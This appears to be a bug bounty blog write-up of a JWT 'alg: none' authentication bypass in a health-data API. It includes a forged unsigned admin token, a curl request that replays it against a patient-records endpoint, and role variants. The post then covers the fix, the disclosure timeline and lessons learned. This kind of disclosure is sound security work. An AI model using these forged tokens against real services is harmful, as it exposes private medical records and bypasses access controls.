---
title: "Coffee, Curiosity & an API – JWT 'alg:none' Exploit in HealthTrack"
description: "An authentication bypass via unsigned JWTs that unlocked admin-level access to sensitive medical data."
date: '2024-02-19'
categories: ["Bug Bounty Writeups"]
tags: ["JWT", "Authentication Bypass", "alg:none", "Burp Suite", "API Security"]
header:
  image: "/images/healthtrack-jwt.png"
---

# **Prologue: Coffee, Curiosity & an API**

It was one of those quiet February evenings. No caffeine left in the mug, but my curiosity was wide awake. The glow from the screen illuminated my desk, casting a soft digital haze. I was drifting through recon mode—scrolling API docs, poking endpoints, intercepting calls like I was casually flipping through a dusty book in a forgotten archive.

Then I stumbled upon **HealthTrack**. A well-documented API, clean URL paths, and a focus on health data—always a red flag in terms of sensitive access control. The endpoint that caught my eye was:

```
/api/auth
```

It seemed too straightforward, too exposed. I paused, narrowed my eyes at the Burp Suite logs, and leaned in.

Something wasn’t quite right.

---

## 1. **Vulnerability Overview**

The core issue was straightforward, yet dangerous: the application accepted **unsigned JWTs**. Specifically, it did not reject tokens using `"alg": "none"` — effectively allowing anyone to forge JWTs without a valid signature.

### **Summary**
- **Attack Vector:** Forged JWT using `"alg": "none"`
- **Impact:** Unauthorized access to sensitive patient medical records
- **Root Cause:** JWT misconfiguration — `alg: none` allowed in production
- **Exploitability:** Trivial
- **Security Risk:** Privilege escalation via forged authentication
- **CVSS Score:** 6.8 (Medium), but more severe depending on context

This wasn’t clever exploitation. It was a fundamental **misunderstanding**—or misconfiguration—of authentication.

---

## 2. **Initial Recon: The Legitimate Token**

To understand the flow, I created a patient account and logged in. I captured a valid JWT via **Burp Suite**.

```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "user": "patient"
}

// Signature
[HMAC-SHA256, base64url encoded]
```

A standard HS256-signed JWT. The signature was present and valid.

But one detail kept nagging me—**no server-side algorithm enforcement**.

---

## 3. **The “What If” Instinct**

Every real bug begins with a simple question. Mine was:

> What happens if I change `alg` to `none` and remove the signature?

If the server was secure, the token would be rejected.

If not—well, let’s just say things could get interesting.

### Forged Token:

```json
// Header
{
  "alg": "none",
  "typ": "JWT"
}

// Payload
{
  "user": "admin"
}
```

Final token (unsigned):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

---

## 4. **Curl Request: The Test**

```bash
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
https://healthtrack.io/api/patient_records
```

Expected: `401` or `403`.

Actual:

```
HTTP 200 OK
```

The response was filled with **sensitive medical data**: patient names, treatments, prescriptions.

I blinked. Then I stared.

**I was in.**

---

## 5. **Personal Thought Process**

### Step 1: Capturing a Legit Token  
_"Let’s get a feel for how the JWTs are built. HS256 is common, so nothing surprising yet."_

### Step 2: Noticing the Lack of Algorithm Enforcement  
_"Are they even verifying the signature or just decoding this thing?"_

### Step 3: Crafting a Fake Admin Token  
_"It shouldn’t work—but if it does, I need to be extremely careful with what I touch."_

### Step 4: Sending the Forged Token  
_"This is either a dead end or the jackpot. There’s no in-between."_

### Step 5: Receiving `200 OK`  
_"They didn’t even validate the signature. This token is just being trusted at face value."_

---

## 6. **Additional Variants**

I tested more roles using unsigned tokens:

```json
{
  "user": "support"
}
```

✅ Accessed internal support APIs

```json
{
  "user": "doctor"
}
```

✅ Accessed appointment scheduling and doctor notes

The system **blindly trusted** the role in the payload. No validation. No signature check. No binding to an actual user.

---

## 7. **Root Cause**

The application’s JWT verification was dangerously flawed.

### Common Vulnerable Patterns:

#### ❌ Scenario 1: Implicit decode() Without Validation

```javascript
jwt.decode(token);
```

This just decodes—it doesn’t verify. Dangerous if used for access control.

#### ❌ Scenario 2: Explicitly Allowing `none`

```javascript
jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });
```

Allowing `none` defeats the purpose of JWT signing.

---

## 8. **Reporting and Timeline**

I reported this via **HackerOne** under the title:  
> "Authentication bypass via JWT misconfiguration"

### **Timeline**
- **Reported:** February 2024  
- **Triaged:** 3 days later  
- **Patched:** Within 1 week  
- **Bounty Awarded:** **$25**

The team responded quickly and patched the issue responsibly.

---

## 9. **Patch Summary**

Server-side JWT verification was updated:

```javascript
jwt.verify(token, secret, { algorithms: ['HS256'] });
```

Additionally:

- Role-based access control now uses the **server-side user database**
- Signature enforcement is mandatory
- `alg: none` is no longer accepted under any condition

---

## 10. **Reflections**

This wasn’t a complicated exploit.

No fancy payloads.  
No multi-stage chaining.  
Just a **simple oversight** with serious implications.

> **Simplicity doesn’t equal harmlessness.**

### **Lessons Learned**
- ✅ Always enforce a secure algorithm explicitly
- ✅ Never trust JWT payloads without verifying the signature
- ✅ Don’t use `jwt.decode()` for auth logic
- ✅ Match token claims with actual server-side data

---

## 11. **Tools Used**
- **Burp Suite** – Intercept & replay tokens
- **cURL** – Simulated API requests
- **jwt.io** – Decode & craft forged tokens
- **Postman** – Structured test environment
- **VS Code** – For quick script experimentation

---

## 12. **Final Thoughts**

This vulnerability isn’t new.

It’s been discussed, documented, and patched in libraries for nearly a **decade**. Yet, here it was again—sitting in production, protecting **sensitive medical data**.

> This wasn’t a breakthrough bug.  
> It was a **reminder** that the basics still matter.

Every token tells a story.

**This one just happened to lie.**
